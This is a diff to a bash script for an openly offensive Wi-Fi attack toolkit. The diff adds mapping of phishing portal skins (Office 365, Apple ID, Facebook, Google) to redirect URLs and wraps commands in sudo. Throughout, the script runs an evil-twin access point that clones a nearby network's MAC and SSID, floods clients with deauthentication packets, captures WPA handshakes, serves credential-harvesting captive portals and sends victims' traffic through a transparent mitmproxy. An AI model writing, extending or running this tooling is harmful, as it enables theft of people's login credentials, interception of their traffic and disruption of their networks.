@@ -19,33 +19,60 @@ MITMSTATE="off"
 [ -d "$LOGDIR" ] || mkdir -p "$LOGDIR"
 [ -d "$SKINS_DIR" ] || mkdir -p "$SKINS_DIR"
 
+declare -A SKIN_TO_REDIRECT=(
+    [o365.html]="https://outlook.office.com/"
+    [apple.html]="https://appleid.apple.com/"
+    [facebook.html]="https://facebook.com/"
+    [google.html]="https://accounts.google.com/"
+    [cafe.html]="https://apple.com/"
+)
+
+SELECTED_SKIN="cafe.html"
+
 function check_cmd() {
     command -v "$1" >/dev/null 2>&1 || { echo -e "${RED}[!] Missing required tool: $1${NC}"; exit 1; }
 }
 
-function check_deps() {
-    check_cmd hostapd
-    check_cmd dnsmasq
-    check_cmd iw
-    check_cmd airodump-ng
-    check_cmd aireplay-ng
-    check_cmd pkill
-    check_cmd python3
-    [ "$1" = "mitm" ] && check_cmd mitmproxy
+function install_deps() {
+    PKGS=(hostapd dnsmasq iw aircrack-ng python3 openssl mitmproxy)
+    MISSING=()
+    for p in "${PKGS[@]}"; do
+        command -v $p >/dev/null 2>&1 || MISSING+=($p)
+    done
+    if [ ${#MISSING[@]} -eq 0 ]; then
+        echo -e "${GREEN}All dependencies are already installed!${NC}"; return;
+    fi
+    echo -e "${YELLOW}You are missing:${NC} ${MISSING[*]}"
+    read -p "Install with your system package manager? [Y/n]: " ans
+    [[ $ans =~ ^[Nn] ]] && echo "Aborted." && return
+    if command -v apt >/dev/null 2>&1; then
+        sudo apt update
+        sudo apt install -y "${MISSING[@]}"
+    elif command -v dnf >/dev/null 2>&1; then
+        sudo dnf install -y "${MISSING[@]}"
+    elif command -v yum >/dev/null 2>&1; then
+        sudo yum install -y "${MISSING[@]}"
+    elif command -v pacman >/dev/null 2>&1; then
+        sudo pacman -Sy --noconfirm "${MISSING[@]}"
+    else
+        echo -e "${RED}No supported package manager found (apt, dnf, yum, pacman).${NC}"
+        return 1
+    fi
+    echo -e "${GREEN}Dependencies installation complete.${NC}"
 }
 
 function cleanup() {
-    pkill -f 'hostapd.*config' 2>/dev/null || true
-    pkill -f 'dnsmasq.*config' 2>/dev/null || true
-    pkill -f 'airodump-ng' 2>/dev/null || true
-    pkill -f 'aireplay-ng' 2>/dev/null || true
-    pkill -f "python3 $PHISH_PORTAL/server.py" 2>/dev/null || true
-    pkill -f mitmproxy 2>/dev/null || true
-    pkill -f mitmweb 2>/dev/null || true
-    iptables -F 2>/dev/null || true
-    iptables -t nat -F 2>/dev/null || true
-    systemctl restart NetworkManager 2>/dev/null || service network-manager restart 2>/dev/null || true
-    [ -n "$IFACE" ] && ip link set "$IFACE" down 2>/dev/null || true
+    sudo pkill -f 'hostapd.*config' 2>/dev/null || true
+    sudo pkill -f 'dnsmasq.*config' 2>/dev/null || true
+    sudo pkill -f 'airodump-ng' 2>/dev/null || true
+    sudo pkill -f 'aireplay-ng' 2>/dev/null || true
+    sudo pkill -f "python3 $PHISH_PORTAL/server.py" 2>/dev/null || true
+    sudo pkill -f mitmproxy 2>/dev/null || true
+    sudo pkill -f mitmweb 2>/dev/null || true
+    sudo iptables -F 2>/dev/null || true
+    sudo iptables -t nat -F 2>/dev/null || true
+    sudo systemctl restart NetworkManager 2>/dev/null || sudo service network-manager restart 2>/dev/null || true
+    [ -n "$IFACE" ] && sudo ip link set "$IFACE" down 2>/dev/null || true
     sleep 1
     echo -e "${GREEN}[✓] Reset complete.${NC}"
 }
@@ -77,34 +104,6 @@ function prompt_iface(){
         [ -n "$IFACE" ] && break
         echo -e "${RED}Invalid choice. Try again.${NC}"
     done
-}
-
-function install_deps() {
-    PKGS=(hostapd dnsmasq iw aircrack-ng python3 openssl mitmproxy)
-    MISSING=()
-    for p in "${PKGS[@]}"; do
-        command -v $p >/dev/null 2>&1 || MISSING+=($p)
-    done
-    if [ ${#MISSING[@]} -eq 0 ]; then
-        echo -e "${GREEN}All dependencies are already installed!${NC}"; return;
-    fi
-    echo -e "${YELLOW}You are missing:${NC} ${MISSING[*]}"
-    read -p "Install with your system package manager? [Y/n]: " ans
-    [[ $ans =~ ^[Nn] ]] && echo "Aborted." && return
-    if command -v apt >/dev/null 2>&1; then
-        sudo apt update
-        sudo apt install -y "${MISSING[@]}"
-    elif command -v dnf >/dev/null 2>&1; then
-        sudo dnf install -y "${MISSING[@]}"
-    elif command -v yum >/dev/null 2>&1; then
-        sudo yum install -y "${MISSING[@]}"
-    elif command -v pacman >/dev/null 2>&1; then
-        sudo pacman -Sy --noconfirm "${MISSING[@]}"
-    else
-        echo -e "${RED}No supported package manager found (apt, dnf, yum, pacman).${NC}"
-        return 1
-    fi
-    echo -e "${GREEN}Dependencies installation complete.${NC}"
 }
 
 function scan_wifi_interfaces_and_networks() {
@@ -152,7 +151,8 @@ EOF
 }
 
 function start_rogue_ap(){
-    check_deps
+    check_cmd iw
+    check_cmd ip
     prompt_iface
     echo -e "${CYAN}Scanning for APs. Please wait...${NC}"
     SCAN_FILE=$(mktemp)
@@ -191,47 +191,45 @@ function start_rogue_ap(){
     last=$(( 0x${macarr[5]} ))
     new_last=$(printf "%02x" $(( (last + 1) & 0xff )) )
     FAKEMAC="${macarr[0]}:${macarr[1]}:${macarr[2]}:${macarr[3]}:${macarr[4]}:$new_last"
-    ip link set "$IFACE" down 2>/dev/null
-    ip link set "$IFACE" address "$FAKEMAC"
-    ip link set "$IFACE" up
-    ip addr flush dev "$IFACE" 2>/dev/null
-    ip addr add 10.0.0.1/24 dev "$IFACE"
-    pkill -f 'hostapd.*config' 2>/dev/null || true
-    pkill -f 'dnsmasq.*config' 2>/dev/null || true
+    sudo ip link set "$IFACE" down 2>/dev/null
+    sudo ip link set "$IFACE" address "$FAKEMAC"
+    sudo ip link set "$IFACE" up
+    sudo ip addr flush dev "$IFACE" 2>/dev/null
+    sudo ip addr add 10.0.0.1/24 dev "$IFACE"
+    sudo pkill -f 'hostapd.*config' 2>/dev/null || true
+    sudo pkill -f 'dnsmasq.*config' 2>/dev/null || true
     gen_configs
-    hostapd "$AP_CONF" > /tmp/hostapd.log 2>&1 &
+    sudo hostapd "$AP_CONF" > /tmp/hostapd.log 2>&1 &
     sleep 3
-    dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
-    iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
-    iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
+    sudo dnsmasq -C "$DNS_CONF" > /tmp/dnsmasq.log 2>&1 &
+    sudo iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true
+    sudo iptables -A FORWARD -i "$IFACE" -j ACCEPT 2>/dev/null || true
     echo -e "${GREEN}[+] Evil Twin \"$FAKESSID\" running on channel $CHANNEL, MAC $FAKEMAC, captive portal at 10.0.0.1${NC}"
 }
 
 function deauth_attack() {
-    check_deps
     prompt_iface
     read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID given${NC}" && return
     while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel${NC}"; done
-    ip link set "$IFACE" down 2>/dev/null
-    iw "$IFACE" set monitor control
-    ip link set "$IFACE" up
-    airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
+    sudo ip link set "$IFACE" down 2>/dev/null
+    sudo iw "$IFACE" set monitor control
+    sudo ip link set "$IFACE" up
+    sudo airodump-ng -c "$CH" --bssid "$BSSID" "$IFACE"
     read -p "Station (leave empty for broadcast): " STATION
     if [ -z "$STATION" ]; then
-        aireplay-ng --deauth 25 -a "$BSSID" "$IFACE"
+        sudo aireplay-ng --deauth 25 -a "$BSSID" "$IFACE"
     else
-        aireplay-ng --deauth 25 -a "$BSSID" -c "$STATION" "$IFACE"
+        sudo aireplay-ng --deauth 25 -a "$BSSID" -c "$STATION" "$IFACE"
     fi
 }
 
 function handshake_capture() {
-    check_deps
     prompt_iface
     read -p "AP BSSID (target): " BSSID; [ -z "$BSSID" ] && echo -e "${RED}No BSSID entered${NC}" && return
     while true; do read -p "Channel: " CH; [[ "$CH" =~ ^[0-9]+$ ]] && break; echo -e "${RED}Invalid channel${NC}"; done
     TS=$(date +%Y%m%d_%H%M%S)
     OUTFILE="$LOGDIR/handshake_$TS"
-    airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
+    sudo airodump-ng -c "$CH" --bssid "$BSSID" -w "$OUTFILE" "$IFACE"
 }
 
 function select_portal_skin() {
@@ -245,20 +243,22 @@ function select_portal_skin() {
     read -p "Select a skin by number: " skn
     [[ "$skn" =~ ^[0-9]+$ ]] && (( skn >= 1 && skn <= ${#skins[@]} )) || { echo "Invalid choice"; return; }
     cp "${skins[$((skn-1))]}" "$PHISH_PORTAL/index.html"
-    echo -e "${GREEN}[✓] Selected skin: $(basename "${skins[$((skn-1))]}")${NC}"
+    SELECTED_SKIN=$(basename "${skins[$((skn-1))]}")
+    echo -e "${GREEN}[✓] Selected skin: $SELECTED_SKIN${NC}"
 }
 
 function phishing_portal() {
-    check_deps
-    cd phishing_portal
-    lsof -i :80 -t || lsof -i :443 -t && { echo -e "${RED}[!] Port 80/443 in use. Aborting.${NC}"; cd ..; return; }
+    SKINBN=$(basename "$SELECTED_SKIN")
+    REDIRECT="${SKIN_TO_REDIRECT[$SKINBN]}"
+    [ -z "$REDIRECT" ] && REDIRECT="https://apple.com/"
     read -p "Launch portal as HTTP (port 80) or HTTPS (port 443)? [http/https]: " proto
+    cd phishing_portal
     if [[ "$proto" =~ ^[Hh][Tt][Tt][Pp][Ss]$ ]]; then
-        sudo python3 server.py --https &
-        echo -e "${GREEN}[+] Captive portal running on HTTPS (https://10.0.0.1)${NC}"
+        sudo python3 server.py --https --redirect "$REDIRECT" &
+        echo -e "${GREEN}[+] Captive portal running on HTTPS (https://10.0.0.1, redirect $REDIRECT)${NC}"
     else
-        sudo python3 server.py &
-        echo -e "${GREEN}[+] Captive portal running on HTTP (http://10.0.0.1)${NC}"
+        sudo python3 server.py --redirect "$REDIRECT" &
+        echo -e "${GREEN}[+] Captive portal running on HTTP (http://10.0.0.1, redirect $REDIRECT)${NC}"
     fi
     cd ..
     read -p "Press Enter to kill captive portal and return to menu..."
@@ -266,7 +266,6 @@ function phishing_portal() {
 }
 
 function start_mitmproxy() {
-    check_deps mitm
     [ "$MITMSTATE" = "on" ] && echo -e "${YELLOW}[!] MITMProxy already running!${NC}" && return
     read -p "MITMProxy ui or cli? [ui/cli]: " mode
     if [ "$mode" = "ui" ]; then
@@ -274,18 +273,17 @@ function start_mitmproxy() {
     else
         sudo mitmproxy --mode transparent --showhost --listen-port 8080 > "$MITM_LOG" 2>&1 &
     fi
-    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
-    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
+    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080
+    sudo iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080
     MITMSTATE="on"
     echo -e "${GREEN}[+] MITMProxy enabled. Logs at $MITM_LOG.${NC}"
 }
 
 function stop_mitmproxy() {
-    pkill -f mitmproxy 2>/dev/null || true
-    pkill -f mitmweb 2>/dev/null || true
-    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 2>/dev/null || true
-    iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 2>/dev/null || true
-    sleep 1
+    sudo pkill -f mitmproxy || true
+    sudo pkill -f mitmweb || true
+    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 80 -j REDIRECT --to-port 8080 || true
+    sudo iptables -t nat -D PREROUTING -i "$IFACE" -p tcp --dport 443 -j REDIRECT --to-port 8080 || true
     MITMSTATE="off"
     echo -e "${GREEN}[+] MITMProxy stopped.${NC}"
 }
@@ -294,7 +292,7 @@ while true; do
     banner
     echo -e "${BLUE}0) Install/check dependencies${NC}"
     echo -e "${BLUE}1) Scan WiFi interfaces & networks${NC}"
-    echo -e "${BLUE}2) Start Rogue AP (Evil Twin)${NC}"
+    echo -e "${BLUE}2) Start Rogue AP (Evil Twin, auto MAC-sim/chan/SSID)${NC}"
     echo -e "${BLUE}3) Deauth client(s) from real AP${NC}"
     echo -e "${BLUE}4) Capture WPA Handshake${NC}"
     echo -e "${BLUE}5) Choose phishing portal skin${NC}"
